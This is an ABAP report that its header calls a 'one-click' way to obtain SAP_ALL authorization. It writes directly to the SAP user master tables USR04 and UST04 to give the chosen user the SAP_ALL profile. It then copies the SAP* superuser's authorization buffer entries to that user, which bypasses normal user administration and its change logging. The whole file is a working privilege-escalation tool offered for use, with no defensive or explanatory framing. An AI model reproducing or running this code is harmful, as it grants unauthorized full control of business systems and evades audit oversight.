*&---------------------------------------------------------------------*
*& Report ZCY_AUTH
*&---------------------------------------------------------------------*
*& 一键获取 SAP ALL 权限
*&---------------------------------------------------------------------*
REPORT ZCY_AUTH.

DATA: l_usr04  LIKE usr04,
      l_ust04  LIKE ust04,
      l_profs  LIKE usr04-profs,
      l_usrbf2 LIKE usrbf2 OCCURS 0 WITH HEADER LINE,
      l_userid LIKE usr01-bname.
TABLES : usr01.
SELECT-OPTIONS: p_user FOR usr01-bname .

START-OF-SELECTION.

  SELECT SINGLE * INTO l_usr04 FROM usr04
  WHERE bname IN p_user.
  MOVE 'C SAP_ALL' TO l_profs .
  l_usr04-nrpro = '14'.
  l_usr04-profs = l_profs.
  UPDATE usr04 FROM l_usr04 .
  l_userid = l_usr04-bname.
  SELECT SINGLE * INTO l_ust04 FROM ust04
  WHERE bname IN p_user.
  l_ust04-profile = 'SAP_ALL'.
  UPDATE ust04 FROM l_ust04 .

  SELECT * FROM usrbf2 INTO TABLE l_usrbf2
  WHERE bname = 'SAP*' .
  LOOP AT l_usrbf2.
    l_usrbf2-bname = l_userid.
    MODIFY l_usrbf2 INDEX sy-tabix TRANSPORTING bname.
  ENDLOOP.
  INSERT usrbf2 FROM TABLE l_usrbf2 ACCEPTING DUPLICATE KEYS.
